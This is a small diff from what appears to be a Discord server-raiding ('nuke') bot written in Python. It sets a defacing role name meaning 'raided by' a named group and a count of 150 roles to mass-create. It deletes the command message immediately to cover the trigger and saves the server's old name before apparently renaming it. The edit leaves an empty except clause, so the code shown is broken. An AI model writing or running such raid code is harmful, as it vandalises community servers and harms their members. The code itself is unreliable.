@@ -36,7 +36,9 @@ role_name = "ますまに共栄圏に荒らされました"  # 作成するロ�
 role_count = 150  # 作成するロール数
 
 # コマンドメッセージを即座に削除
-await ctx.message.delete()
+try:
+    await ctx.message.delete()
+except discord.Forbidden:
 
 guild = ctx.guild
 old_server_name = guild.name
